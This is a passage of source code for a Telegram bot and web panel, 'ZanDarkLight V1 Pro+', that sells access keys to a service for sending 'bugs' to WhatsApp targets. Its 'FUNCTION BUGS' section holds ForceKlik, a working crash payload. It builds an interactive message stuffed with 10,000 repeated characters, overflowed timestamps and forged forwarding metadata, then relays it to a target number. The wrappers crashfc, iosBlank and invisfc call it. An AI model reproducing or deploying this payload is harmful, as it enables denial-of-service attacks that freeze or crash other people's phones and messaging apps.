   - Info akun & expire
   - Status sender aktif
   - Session duration

2. <b>My Senders</b>
   - Tambah sender WhatsApp
   - Hapus sender
   - Reconnect manual
   - Status koneksi

3. <b>Execution Tools</b>
   - Kirim bug ke target
   - Pilih tipe bug
   - History execution
   - Live notifications

4. <b>Real-time Events</b>
   - SSE connection status
   - QR code display
   - Pairing code
   - Error notifications

<b>Login Access:</b>
• URL: https://panel-private.dray1.store
• Use: Username & Key
• Session: 24 hours expiry

<b>Note:</b> Ganti "https://panel-private.dray1.store" dengan domain/IP VPS Anda.
`;

  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback("🔙 Back", "back_to_main")]
  ]);

  await ctx.editMessageText(webPanel, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

// ==================== BACK TO MAIN ==================== //
bot.action("back_to_main", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "User";
  
  const teks = `
<blockquote>🍁 ZanDarkLight V1 Pro+</blockquote>
<i>Advanced WhatsApp Management System</i>

<blockquote>「 Information 」</blockquote>
<b>Developer : @ZanXtzyMods</b>
<b>Version   : 4 ⧸ <code>Pro+</code></b>
<b>Username  : ${username}</b>

<i>Pilih menu di bawah untuk mengakses fitur bot:</i>
`;

  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback("🔑 Create Menu", "show_create_menu"),
      Markup.button.callback("🔐 Access Menu", "show_access_menu")
    ],
    [
      Markup.button.callback("👑 Owner Menu", "show_owner_menu"),
      Markup.button.callback("👥 Sender Menu", "show_sender_menu")
    ],
    [
      Markup.button.callback("⚡ Tools", "show_tools_menu"),
      Markup.button.callback("🛠️ Utilities", "show_utils_menu")
    ],
    [
      Markup.button.callback("ℹ️ Bot Info", "show_bot_info"),
      Markup.button.callback("🌐 Web Panel", "show_web_panel")
    ],
    [
      Markup.button.url("💬 Chat Dev", "https://t.me/zanxtzyzofficialmods"),
      Markup.button.url("📢 Channel", "https://t.me/zanxtzyzofficialmods")
    ]
  ]);

  await ctx.editMessageText(teks, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

// ==================== HELP COMMAND ==================== //
bot.command("help", async (ctx) => {
  const helpText = `
<blockquote>📚 HELP COMMANDS</blockquote>

<b>Kategori Perintah:</b>

1. <b>Owner Commands</b>
   • /connect - Add staff sender
   • /staffsenders - List staff senders
   • /reconnectstaff - Reconnect staff
   • /addkey - Create access key
   • /listkey - List all keys
   • /delkey - Delete key

2. <b>Show Commands</b>
   • <b>/commands</b> - Get source info command

3. <b>Web Panel</b>
   • Login: https://panel-private.dray1.store
   • Features: Sender management, Bug tools

4. <b>Support</b>
   • Developer: @ZanXtzymods
   • Channel: @ZanXtzymods

<b>Gunakan tombol menu di /start untuk navigasi mudah.</b>
`;

  await ctx.reply(helpText, { parse_mode: "HTML" });
});

// ==================== LIST ALL COMMANDS ==================== //
bot.command("commands", async (ctx) => {
  const allCommands = `
<blockquote>📜 ALL AVAILABLE COMMANDS</blockquote>

<b>📱 WhatsApp Connection:</b>
• /connect [number] - Connect WhatsApp as staff
• /staffsenders - List all staff senders  
• /reconnectstaff [number] - Reconnect staff sender

<b>🔑 Access Management:</b>
• /addkey [role,user,duration] - Create access key
• /listkey - List all active keys
• /delkey [username] - Delete user key

<b>ℹ️ Information:</b>
• /start - Show main menu
• /help - Show help information
• /commands - This command list

<b>🌐 Web Interface:</b>
• https://panel-private.dray1.store - Login with username & key

<b>💡 Tips:</b>
- Use /start untuk menu interaktif
- Owner bisa akses semua fitur
- User regular hanya bisa manage sender sendiri
- VIP bisa akses semua sender aktif
`;

  await ctx.reply(allCommands, { parse_mode: "HTML" });
});

bot.command("connect", async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!isOwner(userId)) {
        return ctx.reply("[ ❗ ] - Only Owner can connect staff sender.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /connect <number>\nExample: /connect 1234567890 (US)\n/connect 447123456789 (UK)\n/connect 628123456789 (Indonesia)");
    }

    let number = args[1].replace(/\D/g, '');
    
    if (number.startsWith('0')) {
        number = number.substring(1);
    }
    
    if (!isValidPhoneNumber(number)) {
        return ctx.reply("❌ Invalid phone number format.\n\n• Minimum 8 digits\n• Maximum 15 digits\n• No leading 0\n• All countries supported\n\nExample:\n• 1234567890 (US/Canada)\n• 447123456789 (UK)\n• 628123456789 (Indonesia)");
    }
    
    const countryInfo = getCountryFromNumber(number);
    
    try {
        const sock = await connectToWhatsAppStaff(ctx, number);
        
        if (sock) {
            const userSessions = loadUserSessions();
            const username = `staff_${ctx.from.id}`;
            const staffSenders = userSessions[username] || [];
            
            await ctx.reply(
                `🎉 *Staff Sender Setup Complete!*\n\n` +
                `🌍 *Country:* ${countryInfo.name} (+${countryInfo.code})\n` +
                `📱 *Sender:* ${number}\n` +
                `👤 *Staff ID:* ${ctx.from.id}\n` +
                `🔗 *Status:* Connected ✅\n` +
                `📊 *Total Staff Senders:* ${staffSenders.length}\n\n` +
                `_This sender will auto-reconnect after panel restart._`,
                { parse_mode: "Markdown" }
            );
        }
    } catch (error) {
        await ctx.reply(`❌ Failed to connect: ${error.message}`);
    }
});

bot.command("staffsenders", async (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Only Owner can view staff senders.");
  }

  const userSessions = loadUserSessions();
  let staffSenders = [];
  
  for (const [username, numbers] of Object.entries(userSessions)) {
    if (username.startsWith('staff_')) {
      const staffId = username.replace('staff_', '');
      numbers.forEach(number => {
        staffSenders.push({
          staffId: staffId,
          number: number,
          connected: sessions.has(number)
        });
      });
    }
  }
  
  if (staffSenders.length === 0) {
    return ctx.reply("No staff senders found.");
  }
  
  let message = `📂 *STAFF SENDERS* (${staffSenders.length})\n\n`;
  
  staffSenders.forEach((sender, index) => {
    message += `${index + 1}. ${sender.number}\n`;
    message += `   👤 Staff: ${sender.staffId}\n`;
    message += `   🔗 Status: ${sender.connected ? '✅ Connected' : '❌ Disconnected'}\n\n`;
  });
  
  message += `_Auto-reload: Active ✅_`;
  
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.command("reconnectstaff", async (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Only Owner can reconnect staff.");
  }

  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("Format: /reconnectstaff <number>\nExample: /reconnectstaff 628123456789");
  }

  let number = args[1].replace(/\D/g, '');
  
  try {
    await ctx.reply(`🔄 Reconnecting staff sender ${number}...`);
    
    const userSessions = loadUserSessions();
    let staffUsername = null;
    
    for (const [username, numbers] of Object.entries(userSessions)) {
      if (username.startsWith('staff_') && numbers.includes(number)) {
        staffUsername = username;
        break;
      }
    }
    
    if (!staffUsername) {
      return ctx.reply(`❌ No staff found with sender ${number}`);
    }
    
    const sessionDir = userSessionPath(staffUsername, number);
    
    await reconnectStaffBackground(staffUsername, number, sessionDir);
    await ctx.reply(`✅ Staff sender ${number} reconnected successfully!`);
    
  } catch (error) {
    await ctx.reply(`❌ Failed to reconnect: ${error.message}`);
  }
});

// ==================== UNTUK COMMAND ADDKEY ==================== //
const tempUserData = new Map();

bot.command("addkey", async (ctx) => {
  const ownerId = ctx.from.id.toString();
  
  if (!isOwner(ownerId)) {
    return ctx.reply("[ ❗ ] - Akses hanya untuk Owner.");
  }

  const args = ctx.message.text.split(" ")[1];
  if (!args || !args.includes(",")) {
    return ctx.reply(
      "✗ Format: /addkey namauser,hariExpired,idTelegram\n\n" +
      "Example:\n" +
      "• /addkey zansigma,7,123456789\n" +
      "• /addkey zansukaneko,30,987654321\n\n" +
      "<b>Note:</b>\n" +
      "- Nama user: tanpa spasi, gunakan underscore\n" +
      "- Hari expired: angka (misal 7 untuk 7 hari)\n" +
      "- ID Telegram: angka ID telegram user",
      { parse_mode: "HTML" }
    );
  }

  const parts = args.split(",");
  if (parts.length !== 3) {
    return ctx.reply("✗ Format salah! Pastikan: namauser,hariExpired,idTelegram");
  }

  const username = parts[0].trim();
  const daysStr = parts[1].trim();
  const userIdStr = parts[2].trim();

  if (!username || !daysStr || !userIdStr) {
    return ctx.reply("✗ Tidak boleh ada yang kosong!");
  }

  if (username.includes(" ")) {
    return ctx.reply("✗ Username tidak boleh mengandung spasi! Gunakan underscore (_)");
  }

  const days = parseInt(daysStr);
  const userId = parseInt(userIdStr);

  if (isNaN(days) || days <= 0) {
    return ctx.reply("✗ Hari expired harus angka positif!");
  }

  if (isNaN(userId)) {
    return ctx.reply("✗ ID Telegram harus angka!");
  }

  const users = getUsers();
  const existingUser = users.find(u => u.username === username);
  if (existingUser) {
    return ctx.reply(
      `✗ Username "${username}" sudah terdaftar!\n\n` +
      `Key: ${existingUser.key}\n` +
      `Role: ${existingUser.role || 'user'}\n` +
      `Expired: ${new Date(existingUser.expired).toLocaleString("id-ID")}`
    );
  }

  try {
    await ctx.replyWithPoll(
      "📋 PILIH ROLE UNTUK USER",
      ["👑 Role VIP", "👤 Role User"],
      {
        is_anonymous: false,
        type: "quiz",
        correct_option_id: 0,
        explanation: `User: ${username} | Exp: ${days} hari | ID: ${userId}`,
        parse_mode: "Markdown"
      }
    );

    const instructionMsg = await ctx.reply(
      `📝 *Data yang dimasukkan:*\n\n` +
      `👤 Username: ${username}\n` +
      `📅 Expired: ${days} hari\n` +
      `🆔 ID Telegram: ${userId}\n\n` +
      `*Silakan pilih role di poll di atas!*\n` +
      `Poll akan otomatis menghilang setelah Anda memilih.`,
      { parse_mode: "Markdown" }
    );

    tempUserData.set(ownerId, {
      username,
      days,
      userId,
      chatId: ctx.chat.id,
      messageId: instructionMsg.message_id,
      timestamp: Date.now()
    });

  } catch (error) {
    console.error("Error creating poll:", error);
    
    const keyboard = Markup.inlineKeyboard([
      [
        Markup.button.callback("👑 VIP", `addkey_vip_${username}_${days}_${userId}`),
        Markup.button.callback("👤 User", `addkey_user_${username}_${days}_${userId}`)
      ],
      [Markup.button.callback("❌ Batal", "addkey_cancel")]
    ]);

    const fallbackMsg = await ctx.reply(
      `📝 *Data yang dimasukkan:*\n\n` +
      `👤 Username: ${username}\n` +
      `📅 Expired: ${days} hari\n` +
      `🆔 ID Telegram: ${userId}\n\n` +
      `*Silakan pilih role:*`,
      { 
        parse_mode: "Markdown",
        reply_markup: keyboard.reply_markup 
      }
    );

    tempUserData.set(ownerId, {
      username,
      days,
      userId,
      chatId: ctx.chat.id,
      messageId: fallbackMsg.message_id,
      timestamp: Date.now()
    });
  }
});

// ==================== HANDLER UNTUK POLL ANSWER ==================== //
bot.on("poll_answer", async (ctx) => {
  try {
    const ownerId = ctx.pollAnswer.user.id.toString();
    const pollId = ctx.pollAnswer.poll_id;
    const selectedOption = ctx.pollAnswer.option_ids?.[0];
    if (selectedOption === undefined || selectedOption === null) {
      return;
    }
    
    const tempData = tempUserData.get(ownerId);
    if (!tempData) {
      console.log("No temp data found for owner:", ownerId);
      return;
    }

    const { username, days, userId, chatId, messageId } = tempData;
    
    let role = "";
    let roleName = "";
    
    if (selectedOption === 0) {
      role = "vip";
      roleName = "VIP";
    } else if (selectedOption === 1) {
      role = "user";
      roleName = "User";
    } else {
      tempUserData.delete(ownerId);
      return;
    }

    tempUserData.delete(ownerId);

    const key = generateKey(4);
    const expired = Date.now() + (days * 86400000);

    const expiredStr = new Date(expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    });

    const users = getUsers();
    const userIndex = users.findIndex(u => u.username === username);
    
    if (userIndex !== -1) {
      users[userIndex] = { ...users[userIndex], key, expired, role };
    } else {
      users.push({ username, key, expired, role });
    }

    saveUsers(users);

    try {
      await ctx.telegram.editMessageText(
        chatId,
        messageId,
        null,
        `📨 *Data berhasil dikirim ke user!*\n\n` +
        `✅ User telah menerima data login melalui chat pribadi.`,
        { parse_mode: "Markdown" }
      );
    } catch (editError) {
      console.error("Error editing message:", editError);
      await ctx.telegram.sendMessage(
        chatId,
        `📨 *Data berhasil dikirim ke user!*\n\n` +
        `✅ User telah menerima data login melalui chat pribadi.`,
        { parse_mode: "Markdown" }
      );
    }

    try {
      const botUsername = ctx.botInfo?.username || "your_bot_username";
      const userMessage = `
🎉 *AKUN ZANXDARKLIGHT V1 PRO+*

Halo! Berikut adalah data akun Anda:

👤 *Username:* \`${username}\`
🔑 *Password:* \`${key}\`
🎭 *Role:* ${roleName}
📅 *Expired:* ${expiredStr} WIB

🌐 *Login di:* https://panel-private.dray1.store

📋 *Fitur Akses:*
${role === "vip" ? 
  "• ✅ Akses semua sender aktif\n• ✅ Priority support\n• ✅ Unlimited tools" : 
  "• ✅ Akses sender pribadi\n• ✅ Basic tools\n• ✅ Web dashboard"}

⚠️ *Note:*
- Simpan baik-baik data ini
- Jangan bagikan ke siapapun
- Login sebelum expired
- Bantuan: @ZanXtzymods
      `;

      await ctx.telegram.sendMessage(userId, userMessage, { 
        parse_mode: "Markdown",
        disable_web_page_preview: true 
      });

    } catch (error) {
      console.error("Error sending to user:", error);
      
      try {
        await ctx.telegram.editMessageText(
          chatId,
          messageId,
          null,
          `❌ *Gagal mengirim ke user!*\n\n` +
          `User dengan ID ${userId} belum memulai bot.\n` +
          `Minta user untuk klik: t.me/${ctx.botInfo?.username}\n` +
          `Lalu tekan /start, kemudian coba lagi.\n\n` +
          `*Data untuk dikirim manual:*\n` +
          `Username: ${username}\n` +
          `Password: ${key}\n` +
          `Role: ${roleName}`,
          { parse_mode: "Markdown" }
        );
      } catch (editError2) {
        console.error("Error editing error message:", editError2);
      }
    }
  } catch (error) {
    console.error("Error in poll_answer handler:", error);
  }
});

// ==================== FALLBACK INLINE KEYBOARD HANDLERS ==================== //

bot.action(/^addkey_vip_(.+)_(\d+)_(\d+)$/, async (ctx) => {
  const match = ctx.match;
  const username = match[1];
  const days = parseInt(match[2]);
  const userId = parseInt(match[3]);
  
  await processAddKeySelection(ctx, username, days, userId, "vip");
  await ctx.answerCbQuery();
});

bot.action(/^addkey_user_(.+)_(\d+)_(\d+)$/, async (ctx) => {
  const match = ctx.match;
  const username = match[1];
  const days = parseInt(match[2]);
  const userId = parseInt(match[3]);
  
  await processAddKeySelection(ctx, username, days, userId, "user");
  await ctx.answerCbQuery();
});

bot.action("addkey_cancel", async (ctx) => {
  const ownerId = ctx.from.id.toString();
  const tempData = tempUserData.get(ownerId);
  
  if (tempData) {
    try {
      await ctx.telegram.editMessageText(
        tempData.chatId,
        tempData.messageId,
        null,
        "❌ Proses addkey dibatalkan."
      );
    } catch (error) {
      console.error("Error editing cancel message:", error);
    }
    tempUserData.delete(ownerId);
  }
  
  await ctx.answerCbQuery();
});

async function processAddKeySelection(ctx, username, days, userId, role) {
  const roleName = role === "vip" ? "VIP" : "User";
  const ownerId = ctx.from.id.toString();
  
  tempUserData.delete(ownerId);

  const key = generateKey(4);
  const expired = Date.now() + (days * 86400000);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  });

  const users = getUsers();
  const userIndex = users.findIndex(u => u.username === username);
  
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired, role };
  } else {
    users.push({ username, key, expired, role });
  }

  saveUsers(users);

  try {
    await ctx.editMessageText(
      `📨 *Data berhasil dikirim ke user!*\n\n` +
      `✅ User telah menerima data login melalui chat pribadi.`,
      { parse_mode: "Markdown" }
    );
  } catch (error) {
    console.error("Error editing fallback message:", error);
  }

  try {
    const userMessage = `
🎉 *AKUN ZANXDARKLIGHT V1 PRO+*

Halo! Berikut adalah data akun Anda:

👤 *Username:* \`${username}\`
🔑 *Password:* \`${key}\`
🎭 *Role:* ${roleName}
📅 *Expired:* ${expiredStr} WIB

🌐 *Login di:* https://panel-private.dray1.store

📋 *Fitur Akses:*
${role === "vip" ? 
  "• ✅ Akses semua sender aktif\n• ✅ Priority support\n• ✅ Unlimited tools" : 
  "• ✅ Akses sender pribadi\n• ✅ Basic tools\n• ✅ Web dashboard"}

⚠️ *Note:*
- Simpan baik-baik data ini
- Jangan bagikan ke siapapun
- Login sebelum expired

💬 *Support:* @ZanXtzyMods
    `;

    await ctx.telegram.sendMessage(userId, userMessage, { 
      parse_mode: "Markdown",
      disable_web_page_preview: true 
    });

  } catch (error) {
    console.error("Error sending to user (fallback):", error);
    
    try {
      await ctx.editMessageText(
        `❌ *Gagal mengirim ke user!*\n\n` +
        `User dengan ID ${userId} belum memulai bot.\n` +
        `Minta user untuk klik: t.me/${ctx.botInfo?.username}\n` +
        `Lalu tekan /start, kemudian coba lagi.\n\n` +
        `*Data untuk dikirim manual:*\n` +
        `Username: ${username}\n` +
        `Password: ${key}\n` +
        `Role: ${roleName}`,
        { parse_mode: "Markdown" }
      );
    } catch (editError) {
      console.error("Error editing error message (fallback):", editError);
    }
  }
}

// ==================== CLEANUP TEMP DATA ==================== //
setInterval(() => {
  const now = Date.now();
  const tenMinutes = 10 * 60 * 1000;
  
  for (const [ownerId, data] of tempUserData.entries()) {
    if (now - data.timestamp > tenMinutes) {
      tempUserData.delete(ownerId);
      console.log(`🧹 Cleaned temp data for owner: ${ownerId}`);
    }
  }
}, 5 * 60 * 1000);

// ==================== EXPLORE BY AIISIGMA ==================== //

bot.command("listkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();

  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Akses hanya untuk Owner.");
  }

  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `𞅏 𝑨𝒄𝒕𝒊𝒗𝒆 𝑲𝒆𝒚 𝑳𝒊𝒔𝒕:\n\n`;

  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `${i + 1}. ${u.username} [${u.role?.toUpperCase() || 'USER'}]\nKey: ${u.key}\nExpired: ${exp} WIB\n\n`;
  });

  await ctx.reply(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ❗ ] - Akses hanya untuk Owner - tidak bisa sembarang orang bisa mengakses fitur ini.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey shin");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`✗ Username \`${username}\` not found.`, { parse_mode: "HTML" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✓ Key belonging to ${username} was successfully deleted.`, { parse_mode: "HTML" });
});

bot.command("getcode", async (ctx) => {
    const chatId = ctx.chat.id;
    const input = ctx.message.text.split(" ").slice(1).join(" ").trim();

    if (!input) {
        return ctx.reply("❌ Missing input. Please provide a website URL.\n\nExample:\n/getcode https://example.com");
    }

    const url = input;

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/tools/getcode?url=${encodeURIComponent(url)}`;
        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return ctx.reply("❌ Failed to fetch source code. Please check the URL.");
        }

        const code = data.result;

        if (code.length > 4000) {
            const filePath = `sourcecode_${Date.now()}.html`;
            fs.writeFileSync(filePath, code);

            await ctx.replyWithDocument({ source: filePath, filename: `sourcecode.html` }, { caption: `📄 Full source code from: ${url}` });

            fs.unlinkSync(filePath);
        } else {
            await ctx.replyWithHTML(`📄 Source Code from: ${url}\n\n<code>${code}</code>`);
        }
    } catch (err) {
        console.error("GetCode API Error:", err);
        ctx.reply("❌ Error fetching website source code. Please try again later.");
    }
});

console.clear();
console.log(chalk.bold.white(`\n
⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣖⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⡟⣉⣽⣿⢿⡿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣿⣿⣿⡗⠋⠙⡿⣷⢌⣿⣿⠀⠀⠀⠀⠀⠀⠀
⣷⣄⣀⣿⣿⣿⣿⣷⣦⣤⣾⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀
⠈⠙⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⢀⠀⠀⠀⠀
⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⠿⠿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⡄
⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⢀⡾⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣷⣶⣴⣾⠏⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠋⠁⠀⠀⠀

   ___  _     __  _          _____            
  / _ \\(_)___/ /_(_)  _____ / ___/__  _______ 
 / // / / __/ __/ / |/ / -_) /__/ _ \\/ __/ -_)
/____/_/\\__/\\__/_/|___/\\__/\\___/\\___/_/  \\__/ 
`))

console.log(chalk.cyanBright(`
─────────────────────────────────────
NAME APPS   : ZanXDarkLight
AUTHOR      : Zannnn
ID OWN      : ${ownerIds}
VERSION     : 1 ( I )
─────────────────────────────────────\n\n`));

// Si anjing sialan ini yang bikin gw pusing 
setTimeout(() => {
  console.log('🔄 Starting auto-reload activated');
  forceReloadWithRetry();
}, 15000);

setInterval(() => {
  autoReconnectUserSessions();
}, 30 * 1000);

setTimeout(() => {
  console.log('🔄 Starting user session auto-reconnect');
  autoReconnectUserSessions();
}, 10000);

bot.launch();

setInterval(() => {
  const activeSessions = sessions.size;
  const userSessions = loadUserSessions();
  const totalRegisteredSessions = Object.values(userSessions).reduce((acc, numbers) => acc + numbers.length, 0);
  
  console.log(`📊 Health Check: ${activeSessions}/${totalRegisteredSessions} sessions active`);
  
  if (totalRegisteredSessions > 0 && activeSessions === 0) {
    console.log('🔄 Health check: Found registered sessions but none active, attempting reload...');
    reloadAttempts = 0;
    forceReloadWithRetry();
  } else if (activeSessions > 0) {
    console.log('✅ Health check: Sessions are active');
  }
}, 10 * 60 * 1000);

// ================ FUNCTION BUGS HERE ================== \\
/*
  Function nya isi Ama function punya lu sendiri
*/
async function ForceKlik(sock, target, zid = true) {
 const payload = "꧀".repeat(10000)
 const miaw = await generateWAMessageFromContent(target, proto.Message.fromObject({
 interactiveMessage: {
 body: {
 text: payload
 },
 nativeFlowMessage: {
 messageVersion: 3,
 buttons: [
 {
 name: "quick_reply",
 buttonParamsJson: JSON.stringify({
 display_text: payload,
 id: `Sasuke Back`
 })
 },
 {
 name: "quick_reply",
 buttonParamsJson: JSON.stringify({
 display_text: payload,
 id: `Sasuke Back`
 })
 }

 ]
 },
 contextInfo: {
 conversionDelaySeconds: 9999,
 forwardingScore: 999999,
 isForwarded: true,
 participant: "0@s.whatsapp.net",
 forwardedNewsletterMessageInfo: {
 newsletterJid: "1@newsletter",
 serverMessageId: 1,
 newsletterName: payload,
 contentType: 3,
 },
 quotedMessage: {
 paymentInviteMessage: {
 serviceType: 3,
 expiryTimestamp: 999e+21 * 999e+21
 }
 },
 remoteJid: "@s.whatsapp.net"
 }
 }
 }), {});

 await sock.relayMessage(target, miaw.message, zid ? { messageId: miaw.key.id, participant: { jid: target } } : { messageId: miaw.key.id });
}

// ================== COMBO FUNCTION PEMANGGILAN ================== //
async function bugdelay(sock, target) {
     for (let i = 0; i < 1; i++) {
         await ForceKlik(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

async function iosBlank(sock, target) {
     for (let i = 0; i < 1; i++) {
         await ForceKlik(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }
     
async function UIXAndroid(sock, target) {
     for (let i = 0; i < 1; i++) {
         await ForceKlik(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

async function crashfc(sock, target) {
     for (let i = 0; i < 1; i++) {
         await ForceKlik(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

async function invisfc(sock, target) {
     for (let i = 0; i < 1; i++) {
         await ForceKlik(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }
// ==================== EXPRESS SERVER SETUP ==================== //

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.json());
app.use(refreshSession);
app.use(express.static('public'));

// ==================== ROUTES ==================== //

function requireAuth(req, res, next) {
  const username = req.cookies.sessionUser;
  const clientSessionId = req.cookies.sessionId;
  
  if (!username || !clientSessionId) {
    return res.redirect("/login?msg=Silakan login terlebih dahulu");
  }
  
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    res.clearCookie("sessionUser");
    res.clearCookie("sessionId");
    activeSessions.delete(username);
    return res.redirect("/login?msg=User tidak ditemukan");
  }
  
  if (Date.now() > currentUser.expired) {
    res.clearCookie("sessionUser");
    res.clearCookie("sessionId");
    activeSessions.delete(username);
    return res.redirect("/login?msg=Session expired, login ulang");
  }
  
  const activeSession = activeSessions.get(username);
  if (!activeSession || activeSession.sessionId !== clientSessionId) {
    res.clearCookie("sessionUser");
    res.clearCookie("sessionId");
    activeSessions.delete(username);
    return res.redirect("/login?msg=Session tidak valid atau sedang digunakan di perangkat lain");
  }
  
  const twentyFourHours = 24 * 60 * 60 * 1000;
  if (Date.now() - activeSession.loginTime > twentyFourHours) {
    res.clearCookie("sessionUser");
    res.clearCookie("sessionId");
    activeSessions.delete(username);
    return res.redirect("/login?msg=Session sudah kadaluarsa (24 jam). Silakan login ulang.");
  }
  
  next();
}

app.get("/", (req, res) => {
  const username = req.cookies.sessionUser;
  const clientSessionId = req.cookies.sessionId;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  const activeSession = activeSessions.get(username);
  const twentyFourHours = 24 * 60 * 60 * 1000;
  const isSessionValid = activeSession && 
                        activeSession.sessionId === clientSessionId &&
                        (Date.now() - activeSession.loginTime <= twentyFourHours);

  if (username && currentUser && currentUser.expired && Date.now() < currentUser.expired && isSessionValid) {
    return res.redirect("/dashboard");
  }

  const filePath = path.join(__dirname, "Pro+", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const username = req.cookies.sessionUser;
  const clientSessionId = req.cookies.sessionId;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  const activeSession = activeSessions.get(username);
  const twentyFourHours = 24 * 60 * 60 * 1000;
  const isSessionValid = activeSession && 
                        activeSession.sessionId === clientSessionId &&
                        (Date.now() - activeSession.loginTime <= twentyFourHours);

  if (username && currentUser && currentUser.expired && Date.now() < currentUser.expired && isSessionValid) {
    return res.redirect("/dashboard");
  }

  const filePath = path.join(__dirname, "Pro+", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  if (activeSessions.has(username)) {
    return res.redirect("/login?msg=" + encodeURIComponent("Akun ini sedang aktif di perangkat lain! Silakan logout terlebih dahulu."));
  }

  const sessionId = generateSessionId();
  
  activeSessions.set(username, {
    sessionId: sessionId,
    loginTime: Date.now(),
    ip: req.ip || req.connection.remoteAddress
  });

  const twentyFourHours = 24 * 60 * 60 * 1000;
  
  res.cookie("sessionUser", username, { 
    maxAge: twentyFourHours,
    httpOnly: true 
  });
  res.cookie("sessionId", sessionId, { 
    maxAge: twentyFourHours,
    httpOnly: true 
  });
  
  res.redirect("/dashboard");
});

app.get('/dashboard', (req, res) => {
    const username = req.cookies.sessionUser;
    if (!username) {
        return res.redirect('/login');
    }
    res.sendFile(path.join(__dirname, 'Pro+', 'dashboard.html'));
});

app.get("/tools", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "tools.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/api/dashboard-data", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  if (!currentUser) {
    return res.status(404).json({ error: "User not found" });
  }

  const userRole = currentUser.role || "user";
  
  let activeSendersCount = 0;
  const userSessions = loadUserSessions();
  
  if (userRole === "vip" || userRole === "owner") {
    activeSendersCount = sessions.size;
    console.log(`[DASHBOARD] VIP ${username} - All active senders: ${activeSendersCount}`);
  } else {
    const userSenders = userSessions[username] || [];
    activeSendersCount = userSenders.filter(sender => sessions.has(sender)).length;
    console.log(`[DASHBOARD] USER ${username} - Personal senders: ${activeSendersCount}`);
  }

  const expired = new Date(currentUser.expired).toLocaleString("id-ID", {
